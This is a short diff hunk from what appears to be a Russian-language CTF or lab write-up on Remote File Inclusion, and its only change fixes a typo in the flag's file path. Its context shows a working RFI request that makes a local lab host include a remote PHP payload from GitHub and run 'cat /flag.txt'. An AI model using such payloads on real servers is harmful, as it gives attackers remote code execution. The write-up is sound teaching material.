@@ -88,6 +88,6 @@ https://raw.githubusercontent.com/Truncheon-eng/Remote-File-Inclusion/refs/heads
 ```http
 http://lang.local/index.php?lang=https://raw.githubusercontent.com/Truncheon-eng/Remote-File-Inclusion/refs/heads/main/payloads/payload_1.php&cmd=cat%20/flag.txt
 ```
-Получаем флаг из \/file.txt.
+Получаем флаг из \/flag.txt.
 ![](./img/photo_5269685033084515458_y.jpg)
 [LFI_with_sess_poisoning](https://github.com/Truncheon-eng/LFI_with_sess_poisoning)
